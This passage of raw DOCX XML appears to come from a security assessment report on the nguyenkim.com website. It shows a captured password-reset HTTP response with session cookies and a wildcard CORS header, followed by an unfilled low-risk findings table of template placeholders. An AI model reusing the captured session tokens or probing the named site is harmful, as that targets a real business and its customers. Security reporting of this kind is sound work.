              <w:t>Content-Type: application/json; charset=utf-8</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding</w:t>
              <w:br/>
              <w:t>Set-Cookie: sid_customer_5120c=76cc919a9816115bc171701c3bf91803-C; expires=Wed, 02-Jun-2021 08:20:35 GMT; Max-Age=1209600; path=/; domain=.nguyenkim.com; HttpOnly</w:t>
              <w:br/>
              <w:t>Expires: Thu, 19 Nov 1981 08:52:00 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: no-store, no-cache, must-revalidate</w:t>
              <w:br/>
              <w:t>Pragma: no-cache</w:t>
              <w:br/>
              <w:t>Set-Cookie: mp_skin=desktop; path=/</w:t>
              <w:br/>
              <w:t>Set-Cookie: nkmkey=6a0c57a76500925fc3676e697aca892a; expires=Wed, 19-May-2021 20:20:36 GMT; Max-Age=43200; path=/</w:t>
              <w:br/>
              <w:t>Set-Cookie: message_6a0c57a76500925fc3676e697aca892a=%7B%22type%22%3A%22N%22%2C%22title%22%3A%22Th%5Cu00f4ng+tin%22%2C%22message%22%3A%22M%5Cu1ed9t+email+h%5Cu01b0%5Cu1edbng+d%5Cu1eabn+l%5Cu1ea5y+l%5Cu1ea1i+m%5Cu1eadt+kh%5Cu1ea9u+%5Cu0111%5Cu00e3+%5Cu0111%5Cu01b0%5Cu1ee3c+g%5Cu1eedi+%5Cu0111%5Cu1ebfn+h%5Cu00f2m+th%5Cu01b0+c%5Cu1ee7a+b%5Cu1ea1n.%22%2C%22message_state%22%3A%22I%22%7D; expires=Wed, 19-May-2021 20:20:36 GMT; Max-Age=43200; path=/</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t>Set-Cookie: SRVID=w7|YKTKU|YKSXF; path=/</w:t>
              <w:br/>
              <w:t>Server: NguyenKim</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>{"current_url":"https:\/\/www.nguyenkim.com\/","notifications":[{"type":"S","title":"Thành công","message":"Đường dẫn thay đổi mật khẩu được gửi vào email của bạn!","message_state":"","new":true,"extra":"","init_message":false}]}"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Image-2021-05-19 15:23:41</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5EE5D090" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809"/>
    <w:p w14:paraId="317F1CE0" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74837AD0" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LOW RISK FINDINGS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730B7BAA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidRPr="00CC4809" w:rsidSect="00CC4809">
          <w:footerReference w:type="default" r:id="rId23"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A941D93" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00B25F11" w:rsidRDefault="00CC4809" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>[[</w:t>
      </w:r>
      <w:r w:rsidR="000316BB">
        <w:t>Low</w:t>
      </w:r>
      <w:r w:rsidRPr="00B25F11">
        <w:t>.Vuln.Name_Vuln]]</w:t>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="7A245482" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F3F4AC6" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="1DBA8636" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5ECB0379" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2D5129BA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>_Vuln]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="09D62A29" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="17BB7D97" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0ECDD7A2" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Description_Vuln]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="61205EAF" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="781C253B" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6ACD4D6E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Risk_Vuln]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="19C9B454" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31DD44CE" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="10A55586" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Affect_Vuln]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31CEC27B" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6407C97D" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Available_Vuln]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="761C4569" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6A17ADEA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>RECOMMENDATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2977DB14" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Suggest_Vuln]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="714F2E1D" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="359FC15C" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4CC9B5C5" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Reference_Vuln]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="41CF7899" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="05A90FCA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="127F795F" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4F52529C" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2437FA06" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
